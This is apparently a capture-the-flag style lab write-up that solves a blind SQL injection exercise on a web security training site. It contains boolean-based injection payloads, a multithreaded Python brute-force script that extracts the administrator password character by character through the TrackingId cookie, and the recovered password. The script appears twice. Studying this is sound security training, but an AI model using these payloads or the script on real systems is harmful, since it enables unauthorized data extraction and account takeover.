# Lab: Blind SQL injection with conditional responses
## Task
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

## Solution
As this application uses the `TrackingId` cookie to track users and that cookie relates to the SQL database. Therefore, we can exploit this to retrieve the `administrator` user's password.  
First, we need to make sure that it is indeed vulnerable by injecting:  
```
' AND 1=1--
```  

![image](https://user-images.githubusercontent.com/44528004/130160864-87927571-3ac9-4322-aed2-a78b50fdf6e2.png)  

As the result, it is vulnerable because the response contains the `Welcome back!` string.  

Next, we find the length of the password:  
```
' AND LENGTH((SELECT password FROM users WHERE username='administrator'))=20--
```  

![image](https://user-images.githubusercontent.com/44528004/130160917-2559f3dd-6a7a-43ba-b82c-ce2b017c034f.png)  

Now, we know that the password is 20-character long.  

Then, we start to discover each letter of password:  
```
'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='a'--
'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='b'--
...
'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),2,1)='a'--
'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),2,1)='b'--
...
```

Script:  
```python
import requests
import re
import string
from concurrent import futures
from concurrent.futures import ThreadPoolExecutor

URL = 'https://ac161faf1f29b01d80c9fcdb00be0028.web-security-academy.net/filter?category=Pets'
alphas = list(string.ascii_lowercase)
alphas.extend(list(string.ascii_uppercase))
alphas.extend(list(string.digits))

def brute(i):
    for j in alphas:
        COOKIES =  {'TrackingId':f"B3cN9MgnWyqEImur'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),{i},1)='{j}'--",
        'session':'0WJRV2KyH9TczDNShSpbiuxIimbJjtkv'}
        resp = requests.get(URL, cookies=COOKIES)
        if re.search('Welcome back!', resp.text):
            return (i, j)

res = []
with ThreadPoolExecutor(max_workers=10) as executor:
    tasks = []
    for i in range(1, 21):
        tasks.append(executor.submit(brute, i))
    for f in futures.as_completed(tasks):
        res.append(f.result())

res = sorted(res, key=lambda x: x[0])
print(''.join([x[1] for x in res]))
import requests
import re
import string
from concurrent import futures
from concurrent.futures import ThreadPoolExecutor

URL = 'https://ac161faf1f29b01d80c9fcdb00be0028.web-security-academy.net/filter?category=Pets'
alphas = list(string.ascii_lowercase)
alphas.extend(list(string.ascii_uppercase))
alphas.extend(list(string.digits))

def brute(i):
    for j in alphas:
        COOKIES =  {'TrackingId':f"B3cN9MgnWyqEImur'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),{i},1)='{j}'--",
        'session':'0WJRV2KyH9TczDNShSpbiuxIimbJjtkv'}
        resp = requests.get(URL, cookies=COOKIES)
        if re.search('Welcome back!', resp.text):
            return (i, j)

res = []
with ThreadPoolExecutor(max_workers=10) as executor:
    tasks = []
    for i in range(1, 21):
        tasks.append(executor.submit(brute, i))
    for f in futures.as_completed(tasks):
        res.append(f.result())

res = sorted(res, key=lambda x: x[0])
print(''.join([x[1] for x in res]))
```

```
(env) PS E:\CTF> py .\intruder.py
pfp9jezkril5vmp86w69
```

Login:  

![image](https://user-images.githubusercontent.com/44528004/130164204-0a1a2478-35e9-42f1-836f-6717d8ee1199.png)  
> Solved!
